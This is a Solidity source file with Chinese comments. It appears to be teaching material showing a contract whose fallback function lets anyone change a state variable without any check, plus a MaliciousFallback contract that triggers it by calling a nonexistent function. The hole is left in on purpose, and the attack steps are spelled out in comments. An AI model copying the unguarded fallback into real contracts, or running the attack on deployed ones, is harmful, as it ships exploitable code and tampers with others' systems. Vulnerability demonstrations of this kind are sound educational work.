pragma solidity >=0.8.0;

// 此版本合約存在漏洞：惡意 fallback 函式
// 攻擊合約可呼叫不存在的 function 觸發 fallback，藉由不當改變狀態變數導致系統不穩定
contract RegisterUser {
    // 漏洞重點：狀態變數，未做充分保護
    uint public idError = 0;

    // 正常功能：註冊新用戶
    function setNewUser() external returns (bool) {
        // 省略部分業務邏輯
        return true;
    }

    // 漏洞函式：fallback 函式未加防護，任意呼叫可修改狀態
    fallback() external payable {
        // 漏洞重點：直接累加 idError，未進行權限驗證或條件判斷
        idError += 1;
    }
}

// 範例呼叫合約，用來觸發 RegisterUser 的 fallback 函式
contract callExternalExample {
    function callRegisterUser(RegisterUser a) public returns (bool) {
        // 呼叫一個不存在的 function signature: nonExistentFunction()
        // 此操作會觸發 RegisterUser 合約中的 fallback() 函式
        (bool success, ) = address(a).call(abi.encodeWithSignature("nonExistentFunction()"));
        require(success, "Call failed");
        return success;
    }
}

// 攻擊合約：模擬攻擊者利用惡意 fallback 觸發不當狀態修改
contract MaliciousFallback {
    // 攻擊流程說明：
    // 1. 攻擊者部署 MaliciousFallback 合約
    // 2. 攻擊者呼叫 attack() 函式，傳送少量 Ether 並指定目標 RegisterUser 合約
    // 3. 攻擊者透過不存在的函式呼叫使 RegisterUser.fallback() 被觸發，進而改變 idError 狀態
    function attack(RegisterUser target) public payable {
        (bool success, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("nonExistentFunction()"));
        require(success, "Attack failed");
    }
}
